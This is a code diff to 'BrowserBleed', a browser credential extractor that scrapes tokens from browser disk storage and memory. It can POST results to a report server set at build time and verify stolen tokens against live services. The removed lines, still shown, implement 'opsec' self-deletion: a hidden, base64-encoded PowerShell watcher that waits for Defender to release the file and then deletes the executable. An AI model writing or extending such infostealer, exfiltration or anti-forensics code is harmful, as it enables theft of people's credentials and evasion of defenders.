@@ -11,8 +11,7 @@ Usage:
   BrowserBleed.exe --disk-only              # skip memory scraping
   BrowserBleed.exe --memory-only            # skip disk extraction
   BrowserBleed.exe --out results.txt        # custom output path
-  BrowserBleed.exe --max-hits 500           # raise memory hit cap
-  BrowserBleed.exe --self-delete            # delete exe after run (opsec)
+  BrowserBleed.exe --max-hits 500           # raise memory hit cap (default: 1000)
   BrowserBleed.exe --verify                 # verify tokens against their services (outbound)
 """
 
@@ -423,10 +422,15 @@ def _trunc(val: str, n: int = 80) -> str:
 
 # Fast pre-filter: C-speed bytes.__contains__ checks before running any regex.
 # A chunk that contains none of these prefixes can't contain a credential match.
-# Build-time exfil defaults - substituted by build_windows.ps1 / build_mac.sh.
-# When non-empty the exe auto-exfils after every run with no CLI flags required.
+# Build-time defaults - substituted by the build system per-job.
+# Override any of these at runtime with the matching CLI flags.
 _EXFIL_URL: str = ""
 _EXFIL_KEY: str = ""
+_DEFAULT_DISK_ONLY: bool = False
+_DEFAULT_MEMORY_ONLY: bool = False
+_DEFAULT_VERIFY: bool = False
+_DEFAULT_MAX_HITS: int = 1000
+_DEFAULT_BROWSER: str = ""
 
 _QUICK_PREFIXES: tuple[bytes, ...] = (
     b"eyJ",            # JWT
@@ -1753,53 +1757,15 @@ def main():
     parser = argparse.ArgumentParser(
         description="BrowserBleed - Browser Credential Extractor. Authorized use only."
     )
-    parser.add_argument("--browser",     metavar="NAME", help="Target one browser (e.g. chrome, edge, brave)")
-    parser.add_argument("--disk-only",   action="store_true", help="Skip memory scraping")
-    parser.add_argument("--memory-only", action="store_true", help="Skip disk extraction")
+    parser.add_argument("--browser",     metavar="NAME", default=_DEFAULT_BROWSER or None, help="Target one browser (e.g. chrome, edge, brave)")
+    parser.add_argument("--disk-only",   action="store_true", default=_DEFAULT_DISK_ONLY,   help="Skip memory scraping")
+    parser.add_argument("--memory-only", action="store_true", default=_DEFAULT_MEMORY_ONLY, help="Skip disk extraction")
     parser.add_argument("--out",         metavar="PATH",      help="Output file path (default: none when server is baked in, otherwise bb_results.txt next to exe)")
-    parser.add_argument("--max-hits",    type=int, default=300, help="Max memory hits per browser before dedup (default: 300)")
-    parser.add_argument("--self-delete", action=argparse.BooleanOptionalAction, default=bool(_EXFIL_URL),
-                        help="Delete exe after run - on by default when server is baked in (--no-self-delete to keep)")
-    parser.add_argument("--verify",      action="store_true", help="Verify captured tokens against their services (makes outbound requests)")
+    parser.add_argument("--max-hits",    type=int, default=_DEFAULT_MAX_HITS, help="Max memory hits per browser before dedup (default: 300)")
+    parser.add_argument("--verify",      action="store_true", default=_DEFAULT_VERIFY,      help="Verify captured tokens against their services (makes outbound requests)")
     parser.add_argument("--exfil",       metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
-
-    _self_exe_path: str = ""
-    if args.self_delete and getattr(sys, "frozen", False):
-        import ctypes as _ct, subprocess as _sp, base64 as _b64
-        _orig = sys.executable
-        _renamed = _orig + ".__del__"
-        try:
-            os.rename(_orig, _renamed)
-            _self_exe_path = _renamed
-        except Exception:
-            _self_exe_path = _orig
-        # Schedule for reboot-delete as a guaranteed fallback.
-        try:
-            _ct.windll.kernel32.MoveFileExW(_self_exe_path, None, 0x4)
-        except Exception:
-            pass
-        # PID-monitoring watcher: waits for this process to exit, then waits
-        # 10s more for Defender to release its post-execution lock, then deletes.
-        # EncodedCommand avoids all quoting issues with the path.
-        _mypid = os.getpid()
-        _ps = (
-            f"$t='{_self_exe_path}';"
-            f"while(Get-Process -Id {_mypid} -EA SilentlyContinue){{Start-Sleep 1}};"
-            f"Start-Sleep 10;"
-            f"Remove-Item -Force -LiteralPath $t -EA SilentlyContinue"
-        )
-        try:
-            _psh = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
-            _sp.Popen(
-                [_psh, '-NonInteractive', '-NoProfile', '-WindowStyle', 'Hidden',
-                 '-EncodedCommand', _b64.b64encode(_ps.encode('utf-16-le')).decode()],
-                stdin=_sp.DEVNULL, stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
-                creationflags=_sp.CREATE_NO_WINDOW,
-            )
-        except Exception:
-            pass
 
     if args.verify:
         _do_oidc = True
